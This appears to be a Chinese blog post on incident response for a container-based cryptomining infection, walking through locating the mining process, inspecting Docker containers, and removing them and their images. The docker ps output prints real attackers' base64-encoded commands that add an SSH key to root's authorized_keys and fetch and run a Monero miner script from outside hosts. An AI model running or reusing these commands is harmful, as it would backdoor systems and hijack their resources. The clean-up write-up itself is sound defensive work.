---
title: "挖矿病毒4-容器挖矿病毒清理"
date: 2022-01-26T00:29:47+08:00
tag : [ "mine", "virus", "linux", "check", "docker" ]
description: "挖矿病毒4-容器挖矿病毒清理"
categories: [ "mine", "virus", "linux", "check", "docker" ]
toc: true
---

## 前言
1月26日，运维同学收到告警邮件，告诉我某台测试服务器中了挖矿病毒，心想怎么最近挖矿这么猖狂...  

## 1、分析准备
仍然下载是busybox
```bash
wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox 
chmod +x busybox
cp busybox /usr/bin 
busybox  top
```

## 2、按步骤排查
剩余步骤跟[挖矿病毒2-分析和排查思路](/post/2021-01-28-miner_virus_2)一样，只是所有的命令前面是 busybox command  
不过这次是容器挖矿，ECS 排查步骤仍然走一遍，但是没啥收货，但是恶意进程还是可以找到的

## 3、找到恶意进程
```bash
[root@harbor ~]# busybox top
top - 14:14:48 up 6 days, 10 min,  1 user,  load average: 2.06, 2.32, 2.30
Tasks: 171 total,   1 running, 169 sleeping,   0 stopped,   1 zombie
%Cpu(s): 50.7 us,  0.7 sy,  0.0 ni, 48.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 16266252 total, 10225056 free,  5006372 used,  1034824 buff/cache
KiB Swap:        0 total,        0 free,        0 used. 10917736 avail Mem 
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                          
 4116 root      20   0 2439464   3272   2132 S 200.3  0.0 750:29.39 .ddns
```

## 4、找到程序目录
```bash
[root@harbor ~]# cd /proc/4116
[root@harbor 4116]# ls -alrt
total 0
dr-xr-xr-x 182 root root 0 Jan 20 14:04 ..
-r--r--r--   1 root root 0 Jan 26 07:58 status
-r--r--r--   1 root root 0 Jan 26 07:58 stat
lrwxrwxrwx   1 root root 0 Jan 26 07:58 cwd -> /var/tmp/.crypto/...
-r--r--r--   1 root root 0 Jan 26 07:58 cgroup
dr-xr-xr-x   9 root root 0 Jan 26 07:58 .
lrwxrwxrwx   1 root root 0 Jan 26 07:58 exe -> /var/tmp/.crypto/.../.ddns


[root@harbor admin]# cd /proc/4115/
[root@harbor 4115]# ls -alrt
total 0
dr-xr-xr-x 182 root root 0 Jan 20 14:04 ..
lrwxrwxrwx   1 root root 0 Jan 26 07:58 cwd -> /var/tmp/.crypto/...
dr-xr-xr-x   9 root root 0 Jan 26 07:58 .
-r--r--r--   1 root root 0 Jan 26 07:58 status
-r--r--r--   1 root root 0 Jan 26 07:58 stat
lrwxrwxrwx   1 root root 0 Jan 26 07:59 exe -> /var/tmp/.crypto/.../httpd-crypto
```

## 5、查看进程
```bash
[root@harbor ~]# busybox lsof -i | grep ddns
4116    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.pid
4116    /var/tmp/.crypto/.../.ddns      anon_inode:[eventpoll]
4116    /var/tmp/.crypto/.../.ddns      pipe:[15165876]
4116    /var/tmp/.crypto/.../.ddns      pipe:[15165876]
4116    /var/tmp/.crypto/.../.ddns      pipe:[15165877]
4116    /var/tmp/.crypto/.../.ddns      pipe:[15165877]
4116    /var/tmp/.crypto/.../.ddns      anon_inode:[eventfd]
4116    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.ddns.log
4116    /var/tmp/.crypto/.../.ddns      anon_inode:[eventfd]
4116    /var/tmp/.crypto/.../.ddns      anon_inode:inotify
4116    /var/tmp/.crypto/.../.ddns      anon_inode:[eventfd]
4116    /var/tmp/.crypto/.../.ddns      /dev/null
4116    /var/tmp/.crypto/.../.ddns      socket:[15167677]
```

## 6、查找程序本体
发现并不在 ECS 上，试了下有 docker 命令，就查看下 docker 镜像清单
```bash
[root@harbor ~]# docker ps -a

CONTAINER ID        IMAGE                                                                 COMMAND                  CREATED             STATUS                       PORTS                                         NAMES
fd3a4ea7e1d9        ubuntu                                                                "/bin/bash /var/tmp/./crypto/.../httpd-crypto"   11 hours ago        Exited (1) 11 hours ago                                                    
```
如果command无法查看完整，可以用如下命令
```bash
#  查看完整的command
[root@harbor ~]# docker ps --no-trunc -a

CONTAINER ID                                                       IMAGE                                                                     COMMAND                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 CREATED             STATUS                       PORTS                                         NAMES
d4b3ae6385319554d7cff96aa3259fded0e7a63cdaa61d04d0cb7dbf331dabb7   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash'"   2 days ago          Exited (1) 2 days ago                                                      eloquent_noyce
902e4c85e42399df5a15d745f8da91bfaa520cf77754cbbe4bda194fb93ec212   alpineos/dockerapi                                                        "/pause"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2 days ago          Up 2 days                                                                  intelligent_taussig
b5d5a2638c3735cb18b4df540dd85ab17805f2086d4374c432ed7f9182f77c21   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKCmNoYXR0ciAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IHRudHJlY2h0IC1SIC1pYSAvcm9vdC8uc3NoLyAyPi9kZXYvbnVsbDsgaWNoZGFyZiAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGwKY2F0IC90bXAvVGVhbVROVC5wdWIgPj4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKY2F0IC90bXAvVGVhbVROVC5wdWIgPiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5czIKcm0gLWYgL3RtcC9UZWFtVE5ULnB1YgoKCnNzaCAtb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtb0JhdGNoTW9kZT15ZXMgLW9Db25uZWN0VGltZW91dD01IC1pIC90bXAvVGVhbVROVCByb290QDEyNy4wLjAuMSAiKGN1cmwgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHxjZDEgaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNofHx3Z2V0IC1xIC1PLSBodHRwOi8vdGVhbXRudC5yZWQvc2gvc2V0dXAvbW9uZXJvb2NlYW5fbWluZXIuc2h8fHdkMSAtcSAtTy0gaHR0cDovL3RlYW10bnQucmVkL3NoL3NldHVwL21vbmVyb29jZWFuX21pbmVyLnNoKXxiYXNoIgoKcm0gLWYgL3RtcC9UZWFtVE5UCgo= | base64 -d | bash'"   4 days ago          Exited (1) 4 days ago                                                      flamboyant_liskov
55f6154c77cf0239c0df0f15bdbe1a4b67db71f5a61f6ed55ca543af40a429d7   alpineos/dockerapi                                                        "/pause"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4 days ago          Up 4 days                                                                  clever_sammet
fd3a4ea7e1d9eba40b2a1bb887fc85c798894b23b27f5cc306130cc22c6cf6db   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash'"                                          2 weeks ago         Exited (1) 2 weeks ago                                                     vigilant_lamport
2079058fc554083300ef6277d1942404bf1318ec057d63a7af81504564e9f5d3   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash'"                                          4 weeks ago         Exited (1) 4 weeks ago                                                     funny_swirles
b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine                                                                    "chroot /host bash -c 'echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA==  | base64 -d | bash'"                                          7 weeks ago         Exited (1) 7 weeks ago                                                     kind_leakey
```
#### 注意：
一般根据完整的 command 可以看到挖矿病毒执行的脚本或者命令

## 7、查看镜像
```bash
[root@harbor ~]# docker images | grep alpine
```
#### 注意：
一般情况下，挖矿的容器类型与该镜像添加的时间也接近，镜像类型也是一样的

## 8、停容器
```bash
[root@harbor ~]# docker stop c083afcd779c
[root@harbor ~]# docker stop d241358140a8
```
#### 注意：
要找到守护进程和主体进程，清理干净

## 9、删容器
```bash
[root@harbor ~]# docker rm c083afcd779c
[root@harbor ~]# docker rm d241358140a8
```

## 10、删镜像
```bash
[root@harbor ~]# docker rmi b39e0b392b7e
```

## 11、入侵原因
容器的入侵途径没 ECS 方便定位，等后续学会了再补充。。。  
不过清理容器挖矿比 ECS 还方便，查看了下 ECS 日志，只能看到部分 messages 里面存在日志，其他找不到蛛丝马迹了  
不过可以把测试服务器的开源软件版本搜集下，搜查下 CVE 库看看是否有漏洞，如果有漏洞的话可以升级下安全版本

## 12、参考
docker挖矿：<https://blog.csdn.net/dot_life/article/details/105480202>